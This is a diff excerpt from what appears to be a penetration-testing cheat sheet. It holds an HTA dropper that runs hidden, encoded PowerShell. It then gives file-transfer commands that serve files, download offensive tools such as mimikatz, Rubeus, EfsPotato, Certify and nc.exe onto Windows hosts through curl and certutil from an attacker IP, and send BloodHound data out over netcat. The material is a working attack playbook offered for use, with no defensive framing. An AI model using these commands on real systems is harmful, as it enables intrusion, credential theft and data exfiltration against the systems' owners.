@@ -1301,24 +1301,23 @@ python3 -m http.server 80 /Upload
 echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta
 
 [*] File Transfer
--->> Serve
++---------- Serve ----------+
+fileserve -d /Upload
 python3 -m http.server 80 /Upload
 impacket-smbserver share /Upload/windows
 
--->> Transfer From Linux
++---------- Transfer: From Linux to Windows ----------+
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
-curl $MYIP/windows/Sharphound.exe -o \windows\tasks\Sharphound.exe
-curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
+curl $MYIP/windows/mimikatz.exe -o \windows\tasks\mimikatz.exe
 curl $MYIP/windows/Rubeus.exe -o \windows\tasks\Rubeus.exe
-curl $MYIP/windows/agent.exe -o \windows\tasks\agent.exe
-curl $MYIP/windows/PowerView.ps1 -o \windows\tasks\PowerView.ps1
-curl $MYIP/windows/PrivescCheck.ps1 -o \windows\tasks\PrivescCheck.ps1
+curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
+curl $MYIP/windows/Certify.exe -o \windows\tasks\Certify.exe
+curl $MYIP/windows/Sharphound.exe -o \windows\tasks\Sharphound.exe
 curl $MYIP/bat2exe.bat -o \windows\tasks\bat2exe.bat
-wget $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
 certutil -urlcache -f http://$MYIP/windows/nc.exe \windows\tasks\nc.exe
 
--->> Transfer To Linux
++---------- Transfer: To Linux from Windows ----------+
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 \windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
